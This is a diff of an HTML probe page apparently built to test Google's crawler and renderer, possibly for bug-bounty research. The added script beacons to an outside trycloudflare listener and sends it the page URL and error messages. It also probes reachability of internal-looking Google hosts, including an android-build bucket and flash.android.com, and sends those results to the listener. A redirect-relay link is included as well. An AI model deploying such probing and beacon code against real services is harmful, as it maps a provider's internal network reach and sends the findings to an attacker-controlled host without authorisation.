@@ -21,7 +21,17 @@
 <tr><th>Probe ID</th><th>Target</th><th>Type</th><th>Result</th></tr>
 </table>
 <script>
-const probes=[
+(function(){
+'use strict';
+var L='https://professor-quoted-raid-owned.trycloudflare.com';
+var T=Date.now();
+function beacon(p,extra){try{new Image().src=L+'/'+p+'?t='+T+(extra||'');}catch(e){}}
+function clog(m){try{console.log(m);}catch(e){}}
+window.onerror=function(msg,src,line){beacon('onerror-gvrp','&e='+encodeURIComponent(String(msg).slice(0,120)));return false;};
+beacon('beacon-render-gvrp-1a2b3c','&ref='+encodeURIComponent(location.href));
+try{fetch(L+'/beacon-fetch-gvrp-4d5e6f?t='+T,{mode:'no-cors'}).catch(function(){});}catch(e){}
+clog('RENDER-EXECUTED-gvrp-77e2b4: renderer JS runtime online');
+var probes=[
  ['P01-GITHUB-CONTROL','https://github.com/favicon.ico','reachable-control'],
  ['P02-CANARY-TUNNEL-A','https://hewlett-highways-fewer-scripts.trycloudflare.com/favicon.ico','tunnel-canary'],
  ['P03-CANARY-TUNNEL-B','https://called-liz-mods-incomplete.trycloudflare.com/favicon.ico','tunnel-canary'],
@@ -33,16 +43,24 @@ const probes=[
  ['P09-GCS-ANDROID-BUILD','https://storage.googleapis.com/android-build/favicon.ico','vrp-disclosed-bucket'],
  ['P10-GCS-FLASH','https://flash.android.com/favicon.ico','vrp-disclosed-host'],
 ];
-const t=document.getElementById('matrix');
-probes.forEach(([id,url,kind])=>{
-  const tr=document.createElement('tr');
-  tr.innerHTML='<td class="probe-id">'+id+'</td><td><a href="'+url.replace('/favicon.ico','/')+'">'+url+'</a></td><td>'+kind+'</td><td class="status" id="'+id+'">NOT-RENDERED</td>';
+var t=document.getElementById('matrix');
+var results={};
+probes.forEach(function(pr){
+  var id=pr[0],url=pr[1];
+  var tr=document.createElement('tr');
+  tr.innerHTML='<td class="probe-id">'+id+'</td><td><a href="'+url.replace('/favicon.ico','/')+'">'+url+'</a></td><td>'+pr[2]+'</td><td class="status" id="'+id+'">NOT-RENDERED</td>';
   t.appendChild(tr);
-  const img=new Image();
-  img.onload=()=>{document.getElementById(id).textContent='SUBRESOURCE-LOADED';};
-  img.onerror=()=>{document.getElementById(id).textContent='LOAD-ERROR';};
-  img.src=url+'?probe='+id.toLowerCase();
+  var img=new Image();
+  img.onload=function(){document.getElementById(id).textContent='SUBRESOURCE-LOADED';results[id]='LOADED';clog('PROBE-'+id+'-LOADED-gvrp: '+url+' reachable from renderer');};
+  img.onerror=function(){document.getElementById(id).textContent='LOAD-ERROR';results[id]='ERROR';clog('PROBE-'+id+'-ERROR-gvrp: '+url+' not loadable');};
+  img.src=url+'?probe='+id.toLowerCase()+'&t='+T;
 });
+setTimeout(function(){
+  var r=Object.keys(results).sort().map(function(k){return k.replace(/[^P0-9]/g,'').slice(0,3)+'='+(results[k]==='LOADED'?'ok':'err');}).join('&');
+  beacon('results-gvrp-9h4k2l','&'+r);
+  clog('RESULTS-BEACON-gvrp-6j5m8n dispatched: '+r);
+},6000);
+})();
 </script>
 
 <h2>3. Fetch-render pipeline</h2>
@@ -60,18 +78,6 @@ fetch('data.json').then(r=>r.text()).then(t=>{document.getElementById('fetchdemo
 <li><a href="https://professor-quoted-raid-owned.trycloudflare.com/relay?to=https://example.com/relay-exit-gvrp">command GAMMA — redirect relay</a> (crawler should follow the relay and hit the exit URL)</li>
 </ul>
 
-
-<h2>6. Live-inspection beacons</h2>
-<p>These fire automatically on any rendering pass (Google-InspectionTool live test or WRS render). Each beacon writes a timestamped receipt to the research listener log.</p>
-<script>
-(function(){
-  var L='https://professor-quoted-raid-owned.trycloudflare.com';
-  new Image().src=L+'/beacon-render-gvrp-1a2b3c?ref='+encodeURIComponent(location.href);
-  fetch(L+'/beacon-fetch-gvrp-4d5e6f',{mode:'no-cors'}).catch(function(){});
-  console.log('RENDER-EXECUTED-gvrp-77e2b4: JS ran to completion in crawler renderer');
-  console.log('BEACON-DISPATCH-gvrp-88f3c5: listener beacons sent');
-})();
-</script>
 
 <h2>4. Source-vs-render discriminator</h2>
 <p>STATIC-TOKEN-gvrp-a1b2c3 appears in page source. RENDER-TOKEN-gvrp-d4e5f6 appears only after script execution. If an index snippet contains RENDER-TOKEN but not STATIC-TOKEN-context, indexing is post-render.</p>
